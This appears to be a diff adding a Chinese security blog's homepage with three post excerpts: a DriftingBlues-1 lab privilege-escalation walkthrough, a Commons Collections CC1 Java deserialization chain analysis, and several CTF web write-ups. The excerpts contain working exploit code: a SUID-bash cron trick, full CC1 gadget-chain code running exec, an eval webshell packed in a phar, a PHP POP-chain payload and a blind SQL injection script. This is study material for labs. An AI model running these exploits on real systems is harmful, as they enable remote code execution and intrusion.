@@ -1,0 +1,2017 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+<script src="/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div id="home-head">
+    <div id="home-background" ref="homeBackground" data-images="/images/background.jpg"></div>
+    <div id="home-info" @click="homeClick">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>Arcueid&#39;s BLOG</h1>
+                <h3></h3>
+                <h5></h5>
+            </div>
+        </span>
+    </div>
+</div>
+<div id="home-posts-wrap" true ref="homePostsWrap">
+    <div id="home-posts">
+        
+
+<div class="post">
+    <a href="/2023/07/30/DRIFTINGBLUES-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
+        <h2 class="post-title">DRIFTINGBLUES-1靶机通关详解</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/7/30
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/bdba99ff6ab34b9abe568ec00a1cda10.png" alt="在这里插入图片描述"></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>进web看源码发现 <img src="https://img-blog.csdnimg.cn/cc2e0d34c93c412498c03d013c551c53.png" alt="在这里插入图片描述"><br>解码得到 <code>/noteforkingfish.txt</code><br>访问发现是ook 解得<br><img src="https://img-blog.csdnimg.cn/283ce3edb77b4aff85b34c20d503ceab.png" alt="在这里插入图片描述"><br>先把这个名字记下来 说不定之后要ssh爆破有用<br>然后他说要用 host file <img src="https://img-blog.csdnimg.cn/00de8faccf31481e90dfaf4f8b976f1b.png" alt="在这里插入图片描述"><br>注意到域名可能是<code>driftingblues.box</code><br>加到hosts里试试<br>没啥用 看别人wp知道还得爆破子域名 那kali也添加个hosts然后爆破子域名<br><img src="https://img-blog.csdnimg.cn/f223ade9342140e69f9c14237ef4c260.png" alt="在这里插入图片描述"></p>
+<p>所以添加<code>test.driftingblues.box</code>进去 然后访问<br><img src="https://img-blog.csdnimg.cn/9577716640c447129dc31630217c95bb.png" alt="在这里插入图片描述"><br>扫个目录<br><img src="https://img-blog.csdnimg.cn/684704a72e26485c8e8f7a5832c4a353.png" alt="在这里插入图片描述"><br><code>robots.txt</code>中有<code>ssh_cred.txt</code><br><img src="https://img-blog.csdnimg.cn/090746838644466abdc249afcb0c0d01.png" alt="在这里插入图片描述"><br>说密码最后要加一位数字<br><img src="https://img-blog.csdnimg.cn/65dcb046a9a34f8ab467c7b416a8b2ce.png" alt="在这里插入图片描述"><br>登录上去</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="https://img-blog.csdnimg.cn/909dce890c9840a99c9b95fd56507631.png" alt="在这里插入图片描述"><br>看看有哪些可能有用的账户 <img src="https://img-blog.csdnimg.cn/90b1d163dbd34d3780c84630ffed7623.png" alt="在这里插入图片描述"><br>进<code>home</code>目录 发现没有db用户<br>那再看看eric有没有sudo权限<br><img src="https://img-blog.csdnimg.cn/8322dacb5c394f30af00a1b645c7ce9a.png" alt="在这里插入图片描述"><br>去&#x2F;tmp看看有没有什么临时文件<br><img src="https://img-blog.csdnimg.cn/3cc271c7c50a4d5f8e52429174ba9171.png" alt="在这里插入图片描述"><br>有备份 去&#x2F;var&#x2F;backups看看</p>
+<p><img src="https://img-blog.csdnimg.cn/8b05a202f5ac491293e8c3484649fbc9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bbcabdc2252e493db134115ff419d787.png" alt="在这里插入图片描述"><br>去tmp下看emergency文件 发现没有<br>那么我们可以自己创一个利用<br>手动执行backup.sh 提示没权限<br><img src="https://img-blog.csdnimg.cn/ab1554d084114415b7709d4e0ccf800e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/192a81b6bf7b4e2ba4b61405570fc767.png" alt="在这里插入图片描述"><br>发现其实他自己隔一段时间会自动执行backup.sh<br>那么等一会就行</p>
+<pre><code class="bash">echo &quot;cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash&quot; &gt; emergency
+chmod +x emergency
+</code></pre>
+<p>等rootbash创建了之后 </p>
+<pre><code class="bash">./rootbash -p
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/05d611f5bc9a46da9ee2652324ba14bb.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/07/30/DRIFTINGBLUES-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/07/22/CommonCollections1%E9%93%BE%20%E5%88%86%E6%9E%90/">
+        <h2 class="post-title">CommonCollections1链 分析</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/7/22
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p><strong>本文记录java安全cc链的学习</strong></p>
+<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>首先要知道一些用到的类和接口<br><code>Transformer</code>接口</p>
+<p><img src="https://img-blog.csdnimg.cn/0bc2410045844d5986285a9f3a0f7515.png" alt="在这里插入图片描述"><br>里面有一个待实现的<code>transform</code>方法</p>
+<p><code>InvokerTransformer</code> 相当于重新实现了一个反射<br><img src="https://img-blog.csdnimg.cn/da2d087bc5db4818aa2f789fab3f2888.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/941f80dfa3c2483c9aa822c3937f434e.png" alt="在这里插入图片描述"><br>比如这样可以弹计算器<br><img src="https://img-blog.csdnimg.cn/3f19b14441f7432d8378a0dd2e176cb1.png" alt="在这里插入图片描述"></p>
+<p><code>ChainedTransformer</code><br><img src="https://img-blog.csdnimg.cn/ef7e59261f92453ba42568f3d0f8bea4.png" alt="在这里插入图片描述"><br>需要传一个Transformer数组<br>在其transform方法中可以按数组顺序逐一带入<br><code>ConstantTransformer</code><br>不管接收什么都返回一个常量 在构造函数赋值<br><code>TransformedMap</code><br><img src="https://img-blog.csdnimg.cn/a546475c6230477b83a0064ecd04d2da.png" alt="在这里插入图片描述"><br>接收一个map两个Transformer<br><img src="https://img-blog.csdnimg.cn/fb00f73169db46b28e5660a548a2c2a1.png" alt="在这里插入图片描述"></p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>我们最终想调用invokerTransformer的transform方法<br>那我们就要找谁调用了transform<br><img src="https://img-blog.csdnimg.cn/6e359bc9ce7348edb8f620a0cc6dfa4c.png" alt="在这里插入图片描述"><br>这里考虑<code>TransformedMap</code>类<br><img src="https://img-blog.csdnimg.cn/38949c5621ae46c3a05a3e3f5dd2acf1.png" alt="在这里插入图片描述"><br>然后看valueTransform是怎么来的<br>之前在看相关类的时候已经知道了 有一个Protected的构造函数 这里通过decorate方法得到的<br><img src="https://img-blog.csdnimg.cn/af955abcd33b41009d3fc656854a57f3.png" alt="在这里插入图片描述"></p>
+<p>那么我们先就如上的链子试试能不能连上<br><img src="https://img-blog.csdnimg.cn/a9efd0a046b74ea1ac0fd9dd1953e998.png"><br>继续跟链子</p>
+<p>我们发现<code>AbstractInputCheckedMapDecorator</code>类中的<code>MapEntry</code>类的<code>setValue</code>方法调用了<code>checkSetValue</code><br>且<code>TransformedMap</code>继承<code>AbstractInputCheckedMapDecorator</code><br><img src="https://img-blog.csdnimg.cn/7cd408f01af7493eb5c2e0539cd9b436.png" alt="在这里插入图片描述"><br>所以我们只需要遍历map就可以进setValue<br><img src="https://img-blog.csdnimg.cn/c99bec8f24334fe1a62b53db37a5dc4f.png" alt="在这里插入图片描述"><br>现在变成了 我们需要找到 一个地方遍历数组并调用了setValue<br>然后发现<code>AnnotationInvocationHandler</code>类中的<code>readObject</code>方法直接有调用<code>setValue</code></p>
+<p><img src="https://img-blog.csdnimg.cn/2a8a1518b5dc4cd3a9169d7a34245806.png" alt="在这里插入图片描述">继续观察 要想执行到setValue还需要一定的条件<br><img src="https://img-blog.csdnimg.cn/a2589f41abb546a99c64a1b33f4836a1.png" alt="在这里插入图片描述"></p>
+<p>首先是<code>memberType</code>非空<br>然后判断value是否是memberType的实例<br>并且我们知道Runtime是没有基础Serializable接口的我们需要用反射去拿Runtime的对象</p>
+<p>我们先考虑Runtime的问题,需要反射<br>拿InvokerTransformer实现就是这样</p>
+<pre><code class="java">        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;)
+                .transform(Runtime.class);
+        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;Runtime.class,null&#125;).transform(getRuntimeMethod);
+        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);
+</code></pre>
+<p>看起来很繁琐 我们可以用之前提到的ChainedTransformer来包裹<br>也就是这样</p>
+<pre><code class="c">        Transformer[] transformers = new Transformer[]&#123;
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;)
+                ,new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;)
+                ,new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        chainedTransformer.transform(Runtime.class);
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/6174fc5061794ddc9e8cf8105625299c.png" alt="在这里插入图片描述"><br>然后解决memberType的问题 首先是注解必须要有属性 然后map的key得是属性名<br>我们可以考虑用Target注解的value</p>
+<p>可以顺利进语句<br>现在我们只需要想办法控制<code>setValue</code>中的数据就可以了<br>考虑开始说的<code>ConstantTransformer</code> 把<code>Runtime.class</code>传给他就行<br>于是整个链子代码如下</p>
+<pre><code class="java">package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+
+public class App 
+&#123;
+    public static void main(String[] args) throws Exception &#123;
+
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class)
+                ,new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;)
+                ,new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;)
+                ,new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+//        chainedTransformer.transform(Runtime.class);
+
+        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+        hashMap.put(&quot;value&quot;,&quot;value&quot;);
+        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+
+        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+                .getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        Object obj = constructor.newInstance(Target.class,decoratedMap);
+        serialize(obj);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+    public static void serialize(Object object) throws Exception&#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(object);
+    &#125;
+    public static Object unSerialize(String path) throws Exception&#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+
+</code></pre>
+<h2 id="lazyMap"><a href="#lazyMap" class="headerlink" title="lazyMap"></a>lazyMap</h2><p>上面那个是一个版本 还有一个版本是基于lazyMap的<br>前面都一样 就<code>TransformedMap</code>改成了<code>LazyMap</code><br>我们发现<code>invoke</code>方法中调用了get方法<br>所以我们需要一个动态代理类去代理<code>AnnotationInvocationHandler</code>类 然后调用任意方法 就可以执行<code>invoke</code>方法</p>
+<p><img src="https://img-blog.csdnimg.cn/85412c3467d74a84b49d33cca0f5e8b0.png" alt="在这里插入图片描述"><br>要确保执行到<code>memberValues.get</code>我们不能调有参方法<br>然后只要<code>memberValues</code>是<code>LazyMap</code>的代理类就行<br>刚好 <code>AnnotationInvocationHandler</code> 实现了 <code>InvocationHandler</code>	<img src="https://img-blog.csdnimg.cn/7505191d306b42ebb957f8ca41e2f02e.png" alt="在这里插入图片描述"><br>那么现在的问题就是找无参方法 <img src="https://img-blog.csdnimg.cn/99335e043b7f45a0b1695b80b7c9ce5f.png" alt="在这里插入图片描述"><br><code>entrySet</code>就很好<br>于是链子如下</p>
+<pre><code class="java">package org.example;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class App 
+&#123;
+    public static void main(String[] args) throws Exception &#123;
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class)
+                ,new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;)
+                ,new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;)
+                ,new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Constructor annotationInvocationHandlerConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+                .getDeclaredConstructor(Class.class, Map.class);
+        annotationInvocationHandlerConstructor.setAccessible(true);
+
+
+
+        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+        LazyMap lzMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
+        InvocationHandler lzInvocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class, lzMap);
+        Map proxyLazyMap = (Map) Proxy.newProxyInstance(lzMap.getClass().getClassLoader(), lzMap.getClass().getInterfaces(), lzInvocationHandler);
+
+        Object obj = annotationInvocationHandlerConstructor.newInstance(Override.class, proxyLazyMap);
+        
+        serialize(obj);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+    public static void serialize(Object object) throws Exception&#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(object);
+    &#125;
+    public static Object unSerialize(String path) throws Exception&#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+
+</code></pre>
+<p>这里在反序列化的时候会抛<code>ClassCastException</code>的异常 不过不影响执行</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #00bcd4">java</a>
+        </span>
+        
+    </div>
+    <a href="/2023/07/22/CommonCollections1%E9%93%BE%20%E5%88%86%E6%9E%90/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/07/15/NSSCTF%E5%88%B7web(2)/">
+        <h2 class="post-title">NSSCTF刷web(2)</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/7/15
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="NISACTF-2022-bingdundun"><a href="#NISACTF-2022-bingdundun" class="headerlink" title="[NISACTF 2022]bingdundun~"></a>[NISACTF 2022]bingdundun~</h1><p><img src="https://img-blog.csdnimg.cn/fcfbefa8fc6b43e88bc8ab789380c630.png" alt="在这里插入图片描述"><br>bingdundun处感觉像文件包含,改upload为index<br>发现确实,猜测会补一个后缀.php<br>那常规文件包含都不行了,这里还有一个文件上传的功能,考虑phar协议</p>
+<pre><code class="php">&lt;?php
+
+$phar = new Phar(&quot;test.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();&quot;);
+$phar-&gt;addFromString(&quot;test.php&quot;,&#39;&lt;?php eval($_GET[1]);?&gt;&#39;);
+$phar-&gt;stopBuffering();
+
+</code></pre>
+<p>生成的phar文件改后缀zip上传</p>
+<h1 id="HDCTF-2023-Welcome-To-HDCTF-2023"><a href="#HDCTF-2023-Welcome-To-HDCTF-2023" class="headerlink" title="[HDCTF 2023]Welcome To HDCTF 2023"></a>[HDCTF 2023]Welcome To HDCTF 2023</h1><p><img src="https://img-blog.csdnimg.cn/9e1a2d4f76354fa19be4b785de232a31.png" alt="在这里插入图片描述"><br>死了也行直接给的</p>
+<h1 id="NISACTF-2022-midlevel"><a href="#NISACTF-2022-midlevel" class="headerlink" title="[NISACTF 2022]midlevel"></a>[NISACTF 2022]midlevel</h1><p>Smarty ssti<br>感觉刚做过<br><img src="https://img-blog.csdnimg.cn/622d365475244f85980b3e0daa619be2.png" alt="在这里插入图片描述"></p>
+<h1 id="GKCTF-2020-cve版签到"><a href="#GKCTF-2020-cve版签到" class="headerlink" title="[GKCTF 2020]cve版签到"></a>[GKCTF 2020]cve版签到</h1><p><img src="https://img-blog.csdnimg.cn/ac21081561f44e3cb04538e76e035ce4.png" alt="在这里插入图片描述"></p>
+<h1 id="GXYCTF-2019-BabyUpload"><a href="#GXYCTF-2019-BabyUpload" class="headerlink" title="[GXYCTF 2019]BabyUpload"></a>[GXYCTF 2019]BabyUpload</h1><p><code>.htaccess</code><br>常规的命令执行函数给ban了<br>用无参rce的方式读一下根目录的文件,看看flag叫什么<br><img src="https://img-blog.csdnimg.cn/3e62688b557249a491105547f81d6eaf.png" alt="在这里插入图片描述"><br><code>scandir(array_rand(array_flip(str_split(set_include_path(dirname(dirname(dirname(getcwd()))))))));</code><br>就叫flag,那直接读<br><img src="https://img-blog.csdnimg.cn/495961a158284b2d8ef8ba8d40e0d7bd.png" alt="在这里插入图片描述"></p>
+<h1 id="NSSCTF-2022-Spring-Recruit-babyphp"><a href="#NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babyphp"></a>[NSSCTF 2022 Spring Recruit]babyphp</h1><p><img src="https://img-blog.csdnimg.cn/423f1990d30f4c90a938c6dade1029ad.png" alt="在这里插入图片描述"></p>
+<h1 id="GDOUCTF-2023-EZ-WEB"><a href="#GDOUCTF-2023-EZ-WEB" class="headerlink" title="[GDOUCTF 2023]EZ WEB"></a>[GDOUCTF 2023]EZ WEB</h1><p><img src="https://img-blog.csdnimg.cn/759847eca23f4bcb8c7af6071fd929c7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b85d50d60f81481eb6ce88c08b45c91d.png" alt="在这里插入图片描述"></p>
+<h1 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h1><p><img src="https://img-blog.csdnimg.cn/e617debe5b7a4e9cbdeb2f4b5b21d175.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/013ed0616ec3405ca41b40980d909c42.png" alt="在这里插入图片描述"></p>
+<pre><code class="php">&lt;?php
+
+
+if(isset($_GET[&#39;wish&#39;]))&#123;
+    @unserialize($_GET[&#39;wish&#39;]);
+&#125;
+
+
+class Road_is_Long&#123;
+    public $page;
+    public $string;
+    public function __construct($file=&#39;index.php&#39;)&#123;
+        $this-&gt;page = $file;
+    &#125;
+    public function __toString()&#123;// 3
+        return $this-&gt;string-&gt;page;
+    &#125;
+
+    public function __wakeup()&#123;
+        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;// 4
+            echo &quot;You can Not Enter 2022&quot;;
+            $this-&gt;page = &quot;index.php&quot;;
+        &#125;
+    &#125;
+&#125;
+
+class Try_Work_Hard&#123;
+    protected  $var;
+    public function __construct($var)&#123;
+        $this -&gt; var = $var;
+    &#125;
+    public function append($value)&#123;// 0
+        include($value);
+    &#125;
+    public function __invoke()&#123;
+        $this-&gt;append($this-&gt;var);// 1
+    &#125;
+&#125;
+
+class Make_a_Change&#123;
+    public $effort;
+    public function __construct()&#123;
+        $this-&gt;effort = array();
+    &#125;
+
+    public function __get($key)&#123;// 2
+        $function = $this-&gt;effort;
+        return $function();
+    &#125;
+&#125;
+$p = new Road_is_Long();
+$R = new Road_is_Long();
+$p -&gt; page = $R;
+$M = new Make_a_Change();
+$R -&gt; string = $M;
+$T =new Try_Work_Hard(&#39;/flag&#39;);
+$M -&gt; effort = $T;
+echo urlencode(serialize($p)).&quot;\n&quot;;
+</code></pre>
+<p><code>O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3Bs%3A9%3A%22index.php%22%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</code></p>
+<h1 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h1><pre><code class="python">import requests
+
+url = &#39;http://node2.anna.nssctf.cn:28640//index.php&#39;
+
+flag = &#39;&#39;
+
+for i in range(1, 100):
+    s = 33
+    e = 130
+    mid = (e + s)&gt;&gt;1
+    while True:
+        payload = &#123;
+            &#39;id&#39;: &#39;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#39;.format(i, mid)
+        &#125;
+        res = requests.post(url=url, data=payload).text
+
+        if &#39;Hello, glzjin wants a girlfriend.&#39; in res:
+            s = mid
+        else:
+            e = mid
+        mid = (e + s)&gt;&gt;1
+        if (e-s) &lt;= 1:
+            flag += chr(e)
+            print(flag)
+            break
+    if &#39;&#125;&#39; in flag:
+        break
+</code></pre>
